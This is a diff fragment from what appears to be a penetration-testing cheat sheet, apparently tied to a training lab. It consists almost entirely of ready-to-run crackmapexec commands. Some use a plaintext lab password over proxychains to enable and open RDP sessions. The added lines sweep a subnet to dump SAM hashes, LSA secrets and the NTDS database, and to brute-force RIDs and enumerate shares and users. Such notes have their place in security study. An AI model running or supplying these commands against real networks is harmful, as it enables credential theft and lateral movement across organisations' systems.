@@ -145,6 +145,14 @@ proxychains4 -f /etc/proxychains4.conf crackmapexec rdp 172.16.218.82 -u 'yoshi'
 proxychains4 -f /etc/proxychains4.conf crackmapexec smb 172.16.218.82 -u 'yoshi' -p 'Mushroom!' -M rdp -o ACTION='ENABLE’
 proxychains4 -f /etc/proxychains4.conf xfreerdp /u:yoshi /d:medtech.com /p:Mushroom! /v:172.16.218.82 /cert-ignore
 
+smb:
+cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
+cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
+cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol
+cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares
+cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --users
+cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --rid-brute
+cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 
 ```
 ###### WMI(Remote Procedure Calls (RPC)2 over port 135)
